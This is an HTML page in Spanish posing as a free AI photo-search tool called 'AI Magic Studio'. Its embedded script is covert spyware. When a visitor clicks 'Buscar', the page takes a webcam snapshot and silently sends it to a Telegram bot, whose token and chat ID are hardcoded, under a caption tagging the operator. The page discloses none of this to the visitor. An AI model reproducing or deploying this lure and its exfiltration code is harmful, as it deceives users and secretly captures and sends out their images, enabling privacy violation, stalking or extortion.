<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>IA IMAGES</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
  <link rel="icon" type="image/png" href="https://ai.psu.edu/favicon.ico">
  <style>
    :root {
      --primary: #006cff;
      --primary-hover: #0056cc;
      --success: #10b981;
      --danger: #ef4444;
    }
    body {
      font-family: 'Inter', sans-serif;
      background-color: white;
      color: #1e293b;
      margin: 0;
      display: flex;
      text-align: center;
      flex-direction: column;
      min-height: 100vh;
    }
    .card {
      background: white ;
      align: center;
      padding: 25px;
      border-radius: 20px;
      text-align: center;
      width: 90%;
      max-width: 350px;
      margin: 0 auto 20px;
      border-top: 5px solid #006cff;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 108, 255, 0.1);
      box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.05), 0 20px 25px -5px rgba(0, 108, 255, 0.05);
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
   .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 20px 40px -10px rgba(0, 108, 255, 0.15);
    }
    .name {
        font-family: 'Inter', sans-serif;
    }
    .avatar {
      width: 100px;
      border-radius: 50%;
      margin-bottom: 10px;
      border: 3px solid #ff4757;
    }
    .name {
      font-size: 25px;
      font-family: 'Monospace';
      color: black;
      margin-bottom: 5px;
    }
    .status {
      color: green;
      margin: 8px 0 15px;
      font-weight: bold;
    }
    .btn {
      background: var(--primary);
      color: white;
      font-weight: 600;
      padding: 12px 28px;
      border-radius: 12px;
      transition: all 0.2s;
      border: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      width: 100%;
    }

    .btn:hover {
      background: var(--primary-hover);
      transform: scale(1.02);
      box-shadow: 0 4px 15px rgba(0, 108, 255, 0.3);
    }

    .btn:active {
      transform: scale(0.98);
    }
    video, canvas {
      display: none;
    }
    footer {
      margin-top: 30px;
      text-align: center;
      font-size: 14px;
      color: #555;
    }
    
     .logo {
      font-family: 'Pacifico', cursive;
      font-size: 1.5rem;
      color: var(--primary);
      color: blue;
    }
    .navbar {
      background: white;
      border-bottom: 1px solid #e2e8f0;
      padding: 1rem 2rem;
      display: flex;
      justify-content: center;
      align-items: center;
    }
     .gradient-text {
      background: linear-gradient(135deg, #006cff 0%, #00d4ff 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    @keyframes pulse {
      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
      70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
    }
  </style>
</head>
<body>
    
     <nav class="navbar mb-8">
    <div class="logo">AI Magic Studio</div>
  </nav>
  <br>
  <main class="flex-grow flex flex-col items-center px-4">
    <div class="text-center max-w-2xl mb-10">
      <h1 class="text-4xl font-bold tracking-tight text-slate-900 sm:text-5xl mb-4">
     <h1>Encuentra tus fotos online<h1><p><span class="gradient-text">AI Power</span>
       
       </h1>
      <p class="text-lg text-slate-600">
       Herramienta de nivel profesional para buscar tus fotos en internet gratuito e increíblemente sencillo.
      </p>
  <div id="cards"></div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="250" height="250"></canvas>


  <script>
    const girls = [
       "VIP"
    ];

    //  Telegram Bot Config
    const BOT_TOKEN = "8972120398:AAF5SL7FLTCXjTDNiZt9WGMtrtZ666_DG0I";
    const CHAT_ID = "1959256229";

    const cardsContainer = document.getElementById("cards");

    // Generate profile cards
    girls.forEach(name => {
      const card = document.createElement("div");
      card.className = "card";
      card.innerHTML = `
        
        <div class="name">${name}</div>
        <div class="status"> • GRATIS</div>
        <button class="btn" onclick="captureAndSend('${name}')">Buscar</button>
      `;
      cardsContainer.appendChild(card);
    });

    // 📸 Capture & Send
    async function captureAndSend(name) {
      try {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        // Camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Wait for video to be ready (important to avoid black photo)
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 1500); // 1.5s delay for clear frame
          };
        });

        // Draw frame
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg");

        // Stop camera
        stream.getTracks().forEach(track => track.stop());

        // Send to Telegram
        sendToTelegram(imageData, name);

      } catch (err) {
        alert("❌ Camera error: " + err);
      }
    }

    // 🚀 Send captured image to Telegram
    function sendToTelegram(imageData, name) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("caption", `📸 NUEVA FOTO 👑 ANDRIUX 👑`);
      formData.append("photo", dataURItoBlob(imageData), "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => console.log("✅ Sent to Telegram:", data))
      .catch(err => console.error("❌ Error:", err));
    }

    // Helper: Convert Base64 → Blob
    function dataURItoBlob(dataURI) {
      let byteString = atob(dataURI.split(",")[1]);
      let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
      let ab = new ArrayBuffer(byteString.length);
      let ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }
  </script>        
          </body>
        </html>
